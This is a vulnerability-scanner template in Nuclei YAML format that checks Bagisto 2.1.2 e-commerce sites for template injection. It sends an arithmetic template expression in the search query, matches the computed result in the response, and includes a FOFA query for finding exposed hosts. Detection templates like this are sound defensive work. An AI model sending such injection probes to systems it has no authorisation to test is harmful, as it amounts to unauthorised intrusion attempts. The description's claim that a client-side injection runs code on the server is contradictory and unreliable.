http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '22596288'
    - bagisto
  - part: content_type
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/bagisto-common/search?query={{2288*''9876''}}'
id: bagisto-csti
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:webkul:bagisto:*:*:*:*:*:*:*:*
  description: 'Bagisto is vulnerable to Client-Side Template Injection (CSTI), which
    allows an attacker to execute arbitrary code on the server.

    '
  metadata:
    fofa-query: Bagisto
    max-request: 1
    product: bagisto
    vendor: webkul
  name: Bagisto 2.1.2 Client-Side Template Injection
  reference:
  - https://packetstormsecurity.com/files/179153/Bagisto-2.1.2-Client-Side-Template-Injection.html
